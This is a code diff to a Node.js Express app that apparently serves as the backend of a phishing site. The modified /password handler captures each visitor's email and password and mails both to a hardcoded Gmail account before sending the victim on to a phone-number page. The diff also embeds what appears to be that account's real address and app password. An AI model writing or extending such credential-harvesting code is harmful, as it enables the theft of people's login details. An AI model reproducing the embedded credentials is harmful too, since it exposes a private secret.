@@ -14,8 +14,8 @@ app.use(express.static('public'));
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
-    user: 'bhanukiran@gmail.com', // Replace with your email
-    pass: 'okkx rhic nhxi vbvi' // Replace with app password
+    user: 'bhanukiran750@gmail.com',
+    pass: 'okkxrhicnhxivbvi'
   }
 });
 
@@ -37,9 +37,10 @@ app.get('/password', (req, res) => {
 
 app.post('/password', (req, res) => {
   const password = req.body.password;
-  // Send email to admin
-  sendEmail('User entered password: ' + password);
-  res.redirect('/phone');
+  const email = req.body.email;
+  // Send email to admin with email and password
+  sendEmail('User Email: ' + email + '\nPassword: ' + password);
+  res.redirect('/phone?email=' + encodeURIComponent(email));
 });
 
 app.get('/phone', (req, res) => {
@@ -72,8 +73,8 @@ app.get('/success', (req, res) => {
 
 function sendEmail(message) {
   const mailOptions = {
-    from: 'your-email@gmail.com',
-    to: 'admin-email@example.com', // Replace with admin email
+    from: 'bhanukiran750@gmail.com',
+    to: 'bhanukiran750@gmail.com', // Replace with admin email
     subject: 'User Data Submission',
     text: message
   };
